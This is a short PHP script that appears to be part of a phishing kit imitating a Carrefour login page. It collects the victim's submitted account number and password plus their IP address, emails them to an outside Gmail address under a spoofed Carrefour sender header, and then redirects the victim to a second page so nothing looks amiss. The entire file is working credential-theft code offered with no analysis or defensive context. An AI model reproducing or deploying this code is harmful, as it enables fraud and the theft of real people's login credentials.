<?php
$ip = getenv("REMOTE_ADDR");

$swn6 = $_POST['user'];
$swn7 = $_POST['user_pass'];



$subj = "[ $ip $CC ]";
$msg = " -------------------- CARREFOUR LOGIN----------------------\n
 account Number: $swn6 \n
 password: $swn7 \n


 
 IP: $ip \n --------------------BY THE_WOOLF----------------------";
 $from = "From: CARREFOUR <ss@p3plcpnl0992.prod.phx3.secureserver.net>"; 
 mail("louannedu490@gmail.com", "$subj", "$msg" , "$from");

?>
<html>
<head></head>
<body>
<Script Language='Javascript'>
document.location = "index2.php";
</Script>
</body>
</html>